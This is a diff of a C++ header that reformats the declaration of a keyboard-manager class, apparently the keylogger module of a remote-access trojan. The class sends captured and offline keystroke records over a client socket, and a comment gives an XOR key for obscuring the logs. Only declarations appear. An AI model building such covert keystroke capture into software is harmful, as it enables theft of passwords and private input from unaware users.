@@ -14,22 +14,25 @@
 #define	SIZE_IMM_BUFFER					128
 #define XOR_ENCODE_VALUE				98	// 键盘记录加密的xor值
 
-namespace dhl {
-	class CKeyboardManager : public CManager
-	{
-	public:
-		friend class CClientSocket;
-		CKeyboardManager(CClientSocket* pClient);
-		virtual ~CKeyboardManager();
-		virtual void OnReceive(LPBYTE lpBuffer, UINT nSize);
-		static HINSTANCE g_hInstance;
-		static HINSTANCE g_hInstances;
+namespace dhl
+{
+class CKeyboardManager : public CManager
+{
+public:
+    friend class CClientSocket;
+    CKeyboardManager(CClientSocket* pClient, DLLSERVER_INFO* dll_info);
+    virtual ~CKeyboardManager();
+    virtual void OnReceive(LPBYTE lpBuffer, UINT nSize);
+    static HINSTANCE g_hInstance;
+    static HINSTANCE g_hInstances;
 
-	private:
-		int sendOfflineRecord();
-		int sendStartKeyBoard();
-		int sendKeyBoardData(LPBYTE lpData, UINT nSize);
-	};
+private:
+    int sendOfflineRecord();
+    int sendStartKeyBoard();
+    int sendKeyBoardData(LPBYTE lpData, UINT nSize);
+
+    DLLSERVER_INFO *m_DllInfo;
+};
 }
 
 #endif // !defined(AFX_KEYBOARDMANAGER_H__F0442063_CAAE_4BA1_B6CA_1FCB39A996AC__INCLUDED_)
